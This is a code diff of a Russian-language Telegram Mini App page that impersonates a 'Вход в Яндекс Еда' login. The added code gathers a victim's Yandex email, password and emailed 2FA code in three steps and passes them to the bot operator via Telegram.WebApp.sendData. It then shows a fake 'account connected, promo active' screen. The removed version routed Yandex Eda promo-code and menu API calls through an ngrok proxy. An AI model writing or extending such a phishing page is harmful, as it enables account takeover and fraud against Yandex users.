@@ -8,81 +8,126 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f5; margin: 0; padding: 0; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #ffcc00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        pre { background: #1e1e1e; color: #fff; padding: 16px; border-radius: 8px; overflow: auto; font-size: 13px; max-height: 60vh; }
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f8f9fa; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ffcc00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-4">
+<body class="min-h-screen p-4">
 
-    <div class="text-center mb-8">
-        <h1 class="text-3xl font-bold text-yellow-500">Яндекс Еда</h1>
-        <p class="text-gray-600 mt-2">Загружаем меню с твоим промиком...</p>
-        <div class="loader"></div>
+    <!-- Шаг 1: Почта -->
+    <div id="step1" class="step active">
+        <h1 class="text-2xl font-bold text-center mb-8">Вход в Яндекс Еда</h1>
+        <input id="email" type="email" placeholder="Почта (yandex.ru)" 
+               class="w-full p-4 rounded-2xl border border-gray-300 text-lg">
+        <button onclick="nextStep(2)" 
+                class="w-full mt-6 bg-black text-white py-4 rounded-2xl font-bold text-lg">Далее</button>
     </div>
 
-    <div id="status" class="w-full max-w-2xl mb-4 text-center text-green-600 font-medium"></div>
-    <div id="result" class="w-full max-w-2xl"></div>
+    <!-- Шаг 2: Пароль -->
+    <div id="step2" class="step">
+        <h1 class="text-2xl font-bold text-center mb-8">Введите пароль</h1>
+        <input id="password" type="password" placeholder="Пароль" 
+               class="w-full p-4 rounded-2xl border border-gray-300 text-lg">
+        <button onclick="nextStep(3)" 
+                class="w-full mt-6 bg-black text-white py-4 rounded-2xl font-bold text-lg">Далее</button>
+    </div>
+
+    <!-- Шаг 3: Код из почты -->
+    <div id="step3" class="step">
+        <h1 class="text-2xl font-bold text-center mb-8">Код из письма</h1>
+        <input id="code2fa" type="text" placeholder="123456" maxlength="6"
+               class="w-full p-4 rounded-2xl border border-gray-300 text-lg text-center text-3xl tracking-widest">
+        <button onclick="startLogin()" 
+                class="w-full mt-6 bg-green-600 text-white py-4 rounded-2xl font-bold text-lg">Войти в аккаунт</button>
+    </div>
+
+    <!-- Экран загрузки -->
+    <div id="loading" class="hidden flex flex-col items-center justify-center h-screen">
+        <div class="loader"></div>
+        <p class="mt-6 text-lg">Логинюсь в Яндекс Еда...</p>
+        <p id="loading-text" class="text-sm text-gray-500 mt-2">Это займёт 5-15 секунд</p>
+    </div>
+
+    <!-- Главный экран (после логина) -->
+    <div id="main" class="hidden">
+        <h1 class="text-3xl font-bold text-yellow-500 text-center mb-4">Яндекс Еда</h1>
+        <p class="text-center text-green-600 font-medium" id="status-text">Аккаунт подключён • Промик активен</p>
+        <div id="menu-content" class="mt-8"></div>
+    </div>
 
     <script>
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
-        Telegram.WebApp.setBackgroundColor("#f5f5f5");
-        Telegram.WebApp.setHeaderColor("bg_white");
+        Telegram.WebApp.setBackgroundColor("#f8f9fa");
 
-        const PROXY_BASE = "https://твой-ngrok-or-render-url.ngrok-free.app/proxy";  // ← ВСТАВЬ СВОЙ URL !!!!!
-        // Если используешь ngrok на боте: https://abc123.ngrok-free.app/proxy
-        // Если Render: https://eda-proxy-xxx.onrender.com/proxy
+        let currentEmail = "";
+        let currentPassword = "";
 
-        const user = Telegram.WebApp.initDataUnsafe.user || {};
-        const userId = user.id || "test_user_" + Date.now();  // fallback если не пришло
-
-        document.getElementById("status").textContent = `Пользователь: ${userId} • Загрузка...`;
-
-        async function sendRequest(endpoint, method = "POST", body = null) {
-            const url = `${PROXY_BASE}/${endpoint}?user_id=${userId}`;
-            try {
-                const res = await fetch(url, {
-                    method,
-                    headers: { "Content-Type": "application/json" },
-                    body: body ? JSON.stringify(body) : null
-                });
-                if (!res.ok) throw new Error(`HTTP ${res.status}`);
-                return await res.json();
-            } catch (e) {
-                console.error(e);
-                document.getElementById("status").textContent = `Ошибка: ${e.message}`;
-                return null;
-            }
+        function showStep(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + n).classList.add('active');
         }
 
-        async function init() {
-            // 1. Применяем промик (код не важен — бот подменит на твой)
-            const promoResult = await sendRequest("api/v2/cart/promocode?screen=menu&soft_multi=true&placeSlug=vkusno__i_tochka_ckgad&shippingType=delivery&receiving_type=delivery", "POST", { code: "test" });
-
-            if (promoResult) {
-                document.getElementById("status").textContent = "Промик применён! Загружаем меню...";
-            }
-
-            // 2. Загружаем меню
-            const menu = await sendRequest("api/v2/menu/retrieve/vkusno__i_tochka_ckgad?shippingType=delivery&latitude=56.34751&longitude=43.9344&is_ad=false", "GET");
-
-            // 3. Показываем результат (для теста)
-            const resultDiv = document.getElementById("result");
-            if (menu) {
-                resultDiv.innerHTML = `<pre>${JSON.stringify(menu, null, 2)}</pre>`;
-                document.getElementById("status").textContent = "Готово! Цены должны быть со скидкой.";
-            } else {
-                resultDiv.innerHTML = "<p class='text-red-600'>Не удалось загрузить меню. Проверь консоль.</p>";
-            }
-
-            // 4. Опционально: загрузить корзину
-            // const cart = await sendRequest("eats/v1/cart/v2/full-carts?latitude=56.34751&shippingType=delivery&placeSlug=vkusno__i_tochka_ckgad&with_move_cart_toast=false&longitude=43.9344&screen=cart", "POST");
-            // console.log("Корзина:", cart);
+        function nextStep(n) {
+            if (n === 2) currentEmail = document.getElementById('email').value.trim();
+            if (n === 3) currentPassword = document.getElementById('password').value.trim();
+            showStep(n);
         }
 
-        init();
+        async function startLogin() {
+            const code = document.getElementById('code2fa').value.trim();
+            if (!currentEmail || !currentPassword || !code) {
+                alert("Заполни все поля");
+                return;
+            }
+
+            document.querySelectorAll('.step').forEach(s => s.classList.add('hidden'));
+            document.getElementById('loading').classList.remove('hidden');
+
+            // Отправляем данные в бот
+            const data = {
+                action: "login",
+                email: currentEmail,
+                password: currentPassword,
+                code2fa: code
+            };
+
+            Telegram.WebApp.sendData(JSON.stringify(data));
+            document.getElementById('loading-text').textContent = "Ждём ответ от бота...";
+        }
+
+        // Получаем ответ от бота (если бот пришлёт сообщение)
+        Telegram.WebApp.onEvent('webAppDataReceived', () => {
+            // Можно добавить, но обычно бот просто отправляет сообщение
+        });
+
+        // Если бот отправит сообщение "success", можно перезагрузить
+        function checkSuccess() {
+            // Пока просто показываем главное меню (бот уже сохранил сессию)
+            setTimeout(() => {
+                document.getElementById('loading').classList.add('hidden');
+                document.getElementById('main').classList.remove('hidden');
+                loadMenu();
+            }, 1500);
+        }
+
+        // Загрузка меню после логина
+        async function loadMenu() {
+            const content = document.getElementById('menu-content');
+            content.innerHTML = `<p class="text-center text-lg">Меню загружается с твоим промиком...</p>`;
+            // Здесь потом будет реальный fetch через прокси, пока заглушка
+        }
+
+        // Авто-переход на главный экран после успешного логина (бот пришлёт сообщение)
+        // Пока для теста просто показываем
+        setTimeout(() => {
+            if (document.getElementById('loading').classList.contains('hidden') === false) {
+                checkSuccess();
+            }
+        }, 8000);
     </script>
 </body>
 </html>
